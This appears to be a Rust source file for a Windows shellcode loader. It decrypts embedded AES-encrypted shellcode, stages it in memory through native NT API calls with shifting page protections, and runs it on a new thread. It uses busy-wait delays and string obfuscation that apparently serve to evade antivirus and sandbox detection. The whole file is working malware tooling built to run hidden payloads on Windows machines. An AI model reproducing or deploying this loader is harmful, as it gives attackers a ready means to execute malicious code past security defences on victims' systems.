#![feature(asm)]
use std::env;
use aes::{Aes128};
use cfb_mode::Cfb;
use cfb_mode::cipher::{NewCipher, AsyncStreamCipher};
use windows::{Win32::System::Memory::*, Win32::System::SystemServices::*};
use ntapi::{ntmmapi::*, ntpsapi::*, ntobapi::*, winapi::ctypes::*};
use std::time::{Instant};
use obfstr::obfstr;

type Aes128Cfb = Cfb<Aes128>;

pub struct Injector {
    shellcode: Vec<u8>,
}

impl Injector {
    pub fn new(shellcode: Vec<u8>) -> Injector {
        Injector { shellcode }
    }

    pub fn run_in_current_process(&mut self) {
        unsafe {
            let mut protect = PAGE_NOACCESS.0;
            let mut map_ptr: *mut c_void = std::ptr::null_mut();
            let mut sc_len = self.shellcode.len() * 5;
            NtAllocateVirtualMemory(NtCurrentProcess, &mut map_ptr, 0, &mut sc_len, MEM_COMMIT.0 | MEM_RESERVE.0, protect);
            custom_sleep();
            NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_READWRITE.0, &mut protect);
            custom_sleep();
            std::ptr::copy_nonoverlapping(self.shellcode.as_ptr(), map_ptr as *mut u8, self.shellcode.len());
            NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_NOACCESS.0, &mut protect);
            custom_sleep();
            NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_EXECUTE.0, &mut protect);
            custom_sleep();
            let mut thread_handle : *mut c_void = std::ptr::null_mut();
            NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, std::ptr::null_mut(), NtCurrentProcess, map_ptr, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
            NtWaitForSingleObject(thread_handle, 0, std::ptr::null_mut());
        }
    }
}

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.enc");
const SHELLCODE_LENGTH: usize = SHELLCODE_BYTES.len();

#[no_mangle]
#[link_section = ".text"]
static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("../shellcode.enc");
static AES_KEY: [u8; 16] = *include_bytes!("../aes.key");
static AES_IV: [u8; 16] = *include_bytes!("../aes.iv");

fn decrypt_shellcode_stub() -> Vec<u8> {
    let mut cipher = Aes128Cfb::new_from_slices(&AES_KEY, &AES_IV).unwrap();
    let mut buf = SHELLCODE.to_vec();
    cipher.decrypt(&mut buf);
    buf
}

fn custom_sleep() {
    let now = Instant::now();
    for _ in 0..100 {
        for _ in 0..100 {
            for _ in 0..100 {
                for _ in 0..100 {
                    print!("");
                }
            }
        }
    }
    println!("{} {} {}", obfstr!("el@ps3d:"), now.elapsed().as_millis(), obfstr!("ms."));
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args[1] == "activate" {
        let mut injector = Injector::new(decrypt_shellcode_stub());
        injector.run_in_current_process();
    }
}
